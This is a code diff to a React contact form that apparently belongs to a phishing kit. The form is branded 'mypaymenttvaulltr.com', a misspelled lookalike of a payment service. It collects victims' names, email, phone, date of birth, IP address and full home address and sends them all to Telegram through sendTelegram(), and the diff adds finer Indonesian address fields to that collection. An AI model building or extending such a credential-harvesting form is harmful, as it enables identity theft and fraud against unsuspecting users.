@@ -21,7 +21,10 @@ export default function ContactForm() {
   const [lastName, setLastName] = useState("");
   const [email, setEmail] = useState("");
   const [phone, setPhone] = useState("");
+  const [houseNo, setHouseNo] = useState("");
+  const [complex, setComplex] = useState("");
   const [address, setAddress] = useState("");
+  const [district, setDistrict] = useState("");
   const [city, setCity] = useState("");
   const [state, setState] = useState("");
   const [postal, setPostal] = useState("");
@@ -66,7 +69,9 @@ export default function ContactForm() {
     if (!lastName.trim()) e.lastName = "Required";
     if (!email.trim()) e.email = "Required";
     if (!phone.trim()) e.phone = "Required";
+    if (!houseNo.trim()) e.houseNo = "Required";
     if (!address.trim()) e.address = "Required";
+    if (!district.trim()) e.district = "Required";
     if (!city.trim()) e.city = "Required";
     if (!state.trim()) e.state = "Required";
     if (!postal.trim()) e.postal = "Required";
@@ -97,7 +102,10 @@ export default function ContactForm() {
           lastName,
           email,
           phone,
+          houseNo,
+          complex,
           address,
+          district,
           city,
           state,
           postalCode: postal,
@@ -115,20 +123,24 @@ export default function ContactForm() {
         `🔐 <b>mypaymenttvaulltr.com</b>\n` +
         `📋 <b>Form Data User</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `👤 <b>Username</b>       : <code>${username}</code>\n` +
-        `📛 <b>First Name</b>     : ${firstName}\n` +
-        `📛 <b>Last Name</b>      : ${lastName}\n` +
-        `📧 <b>Email</b>          : ${email}\n` +
-        `📱 <b>Mobile Phone</b>   : ${phone}\n` +
-        `🏠 <b>Mailing Address</b>: ${address}\n` +
-        `🏙️ <b>City</b>           : ${city}\n` +
-        `📍 <b>State</b>          : ${state}\n` +
-        `📮 <b>Postal Code</b>    : ${postal}\n` +
-        `🎂 <b>Date of Birth</b>  : ${dob}\n` +
-        `📌 <b>Inquiry Type</b>   : ${inquiryType}\n` +
-        `💬 <b>Message</b>        : ${message || "-"}\n\n` +
-        `🌐 <b>IP & Lokasi</b>    : <code>${ip}</code>\n` +
-        `🕐 <b>Waktu</b>          : ${now}\n` +
+        `👤 <b>Username</b>         : <code>${username}</code>\n` +
+        `📛 <b>First Name</b>       : ${firstName}\n` +
+        `📛 <b>Last Name</b>        : ${lastName}\n` +
+        `📧 <b>Email</b>            : ${email}\n` +
+        `📱 <b>Mobile Phone</b>     : ${phone}\n` +
+        `🎂 <b>Date of Birth</b>    : ${dob}\n\n` +
+        `🏘️ <b>ALAMAT LENGKAP</b>\n` +
+        `🏠 <b>No Rumah / Blok</b>  : ${houseNo}\n` +
+        `🏢 <b>Nama Komplek</b>     : ${complex || "-"}\n` +
+        `🛣️ <b>Nama Jalan</b>       : ${address}\n` +
+        `🏘️ <b>Kecamatan</b>        : ${district}\n` +
+        `🏙️ <b>Kota / Kab</b>       : ${city}\n` +
+        `📍 <b>Provinsi</b>         : ${state}\n` +
+        `📮 <b>Kode Pos</b>         : ${postal}\n\n` +
+        `📌 <b>Inquiry Type</b>     : ${inquiryType}\n` +
+        `💬 <b>Message</b>          : ${message || "-"}\n\n` +
+        `🌐 <b>IP & Lokasi</b>      : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>            : ${now}\n` +
         `━━━━━━━━━━━━━━━━━━━━━`;
 
       await sendTelegram(text);
@@ -257,11 +269,35 @@ export default function ContactForm() {
               {errors.phone && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.phone}</p>}
             </div>
 
-            {/* Mailing Address */}
+            {/* No Rumah & Blok */}
             <div>
               <input
                 className="cf-input"
-                placeholder="Mailing Address*"
+                placeholder="No. Rumah & Blok*"
+                value={houseNo}
+                onChange={(e) => setHouseNo(e.target.value)}
+                style={inputStyle(!!errors.houseNo)}
+              />
+              {errors.houseNo && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.houseNo}</p>}
+            </div>
+
+            {/* Nama Perumahan / Komplek */}
+            <div>
+              <input
+                className="cf-input"
+                placeholder="Nama Perumahan / Komplek / Residence"
+                value={complex}
+                onChange={(e) => setComplex(e.target.value)}
+                style={inputStyle(!!errors.complex)}
+              />
+              {errors.complex && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.complex}</p>}
+            </div>
+
+            {/* Nama Jalan */}
+            <div>
+              <input
+                className="cf-input"
+                placeholder="Nama Jalan*"
                 value={address}
                 onChange={(e) => setAddress(e.target.value)}
                 style={inputStyle(!!errors.address)}
@@ -269,11 +305,23 @@ export default function ContactForm() {
               {errors.address && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.address}</p>}
             </div>
 
-            {/* City */}
+            {/* Kecamatan */}
             <div>
               <input
                 className="cf-input"
-                placeholder="City*"
+                placeholder="Kecamatan*"
+                value={district}
+                onChange={(e) => setDistrict(e.target.value)}
+                style={inputStyle(!!errors.district)}
+              />
+              {errors.district && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.district}</p>}
+            </div>
+
+            {/* Kota / Kabupaten */}
+            <div>
+              <input
+                className="cf-input"
+                placeholder="Kota / Kabupaten*"
                 value={city}
                 onChange={(e) => setCity(e.target.value)}
                 style={inputStyle(!!errors.city)}
@@ -281,11 +329,11 @@ export default function ContactForm() {
               {errors.city && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.city}</p>}
             </div>
 
-            {/* State */}
+            {/* Provinsi */}
             <div>
               <input
                 className="cf-input"
-                placeholder="State*"
+                placeholder="Provinsi*"
                 value={state}
                 onChange={(e) => setState(e.target.value)}
                 style={inputStyle(!!errors.state)}
@@ -293,11 +341,11 @@ export default function ContactForm() {
               {errors.state && <p style={{ fontSize: 11, color: "#e53e3e", marginTop: 3 }}>{errors.state}</p>}
             </div>
 
-            {/* Postal Code */}
+            {/* Kode Pos */}
             <div>
               <input
                 className="cf-input"
-                placeholder="Postal Code*"
+                placeholder="Kode Pos*"
                 value={postal}
                 onChange={(e) => setPostal(e.target.value)}
                 style={inputStyle(!!errors.postal)}
